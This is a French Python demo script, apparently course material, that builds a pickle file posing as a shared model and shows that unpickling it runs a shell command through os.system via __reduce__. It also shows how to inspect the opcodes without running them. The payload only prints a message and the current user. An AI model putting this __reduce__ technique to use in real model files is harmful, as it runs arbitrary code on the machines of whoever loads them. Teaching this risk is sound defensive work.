"""Démo S1 : charger un pickle, c'est exécuter du code.

Usage (dans un environnement jetable : venv, conteneur ou VM) :
    python demo_pickle.py create     # fabrique "modele_partage.pkl"
    python demo_pickle.py inspect    # désassemble le fichier SANS l'exécuter
    python demo_pickle.py load       # charge le fichier comme un modèle "normal"

La charge utile est volontairement inoffensive (affiche un message et l'utilisateur
courant). Un attaquant pourrait à la place exfiltrer des variables d'environnement
(clés cloud), ouvrir un shell distant ou chiffrer des fichiers.
"""

from __future__ import annotations

import os
import pickle
import pickletools
import sys
from pathlib import Path

PAYLOAD_FILE = Path(__file__).with_name("modele_partage.pkl")


class FakeModel:
    """Ressemble à un modèle. __reduce__ dit à pickle comment le reconstruire :
    ici, en appelant os.system avec une commande arbitraire."""

    def __reduce__(self):
        cmd = "echo '[!] Code exécuté pendant pickle.load() par :' && whoami"
        return (os.system, (cmd,))


def create() -> None:
    PAYLOAD_FILE.write_bytes(pickle.dumps(FakeModel()))
    print(f"Fichier créé : {PAYLOAD_FILE.name} ({PAYLOAD_FILE.stat().st_size} octets)")


def inspect() -> None:
    # pickletools lit les opcodes sans rien exécuter : on y voit "system" et la commande.
    pickletools.dis(PAYLOAD_FILE.read_bytes())


def load() -> None:
    print("Chargement du 'modèle'...")
    with PAYLOAD_FILE.open("rb") as f:
        obj = pickle.load(f)  # noqa: S301  (c'est précisément le problème démontré)
    print(f"Objet obtenu : {obj!r}  (le code a déjà tourné, avant même toute prédiction)")


if __name__ == "__main__":
    actions = {"create": create, "inspect": inspect, "load": load}
    if len(sys.argv) != 2 or sys.argv[1] not in actions:
        sys.exit(f"Usage : python {Path(__file__).name} [create|inspect|load]")
    actions[sys.argv[1]]()
